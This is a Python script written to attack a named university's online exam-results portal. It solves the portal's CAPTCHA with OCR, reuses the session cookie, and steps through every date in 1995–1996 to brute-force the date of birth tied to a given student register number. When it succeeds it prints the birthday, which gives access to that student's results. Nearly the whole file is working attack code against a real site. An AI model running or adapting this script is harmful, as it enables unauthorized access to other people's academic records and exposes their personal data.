import requests
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
from StringIO import StringIO
import time
import sys


cerror=0
berror=0
count=0
result_url="http://evarsity.srmuniv.ac.in/srmwebonline/exam/onlineResult.jsp"
captcha_url="http://evarsity.srmuniv.ac.in/srmwebonline/Captcha"
name=int(round(time.time() * 1000))
REGNO=sys.argv[1]

def getCaptcha():
    captcha=requests.get(captcha_url)
    with open(str(name)+'.jpg', 'wb') as test:
        test.write(captcha.content)
    cap=pytesseract.image_to_string(Image.open(str(name)+'.jpg'))
    cook=captcha.cookies['JSESSIONID']
    return cook,cap

def genfrmDate(date,month,year):
    month=str(month).zfill(2)
    date=str(date).zfill(2)
    return str(str(year)+"-"+str(month)+"-"+str(date)),date,month,year



caperror="Invalid Verification Code"
bdayerror="Given Date of Birth is Incorrect"
regnoerror="Given Register Number "+REGNO+" not available"
success=False
year=1995
month=1
date=1
while(success!=True):

    while year<1997 and month<13 and date<32:


        count+=1
        frmdate,txtFromDate,selMonth,txtYear=genfrmDate(date,month,year)
        print "Trying date: " +frmdate
        gc,cap=getCaptcha()
        headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.11; en-US; rv:1.9) Gecko/2008061004 Firefox/3.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-us,en;q=0.5",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Keep-Alive":"300",
        "Referer": "http://evarsity.srmuniv.ac.in/srmwebonline/exam/onlineResult.jsp",
        "Cookie":"JSESSIONID="+str(gc),
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "109",
        "Connection":"close"
        }
        data={
        "frmdate":frmdate,
        "iden":"1",
        "txtRegisterno":REGNO,
        "txtFromDate":txtFromDate,
        "selMonth":selMonth,
        "txtYear":txtYear,
        "txtvericode":cap.replace(" ","")
        }
        result=requests.post(result_url,data=data,headers=headers)

        if caperror in result.text:
            cerror+=1

        elif bdayerror in result.text:
            berror+=1
            date+=1

        elif regnoerror in result.text:
            print "Enter a valid reg Number"
            exit()
            break
        else:
            print "[!] Birthday Found"
            print frmdate
            print "Captcha Error: "+str(cerror)
            print "Birthday Error "+str(berror)
            print "Loop Count: "+str(count)

            success=True
            exit()
    if(date>31):
        date=1
        month+=1
    if(month>12):
        year+=1
        month=1
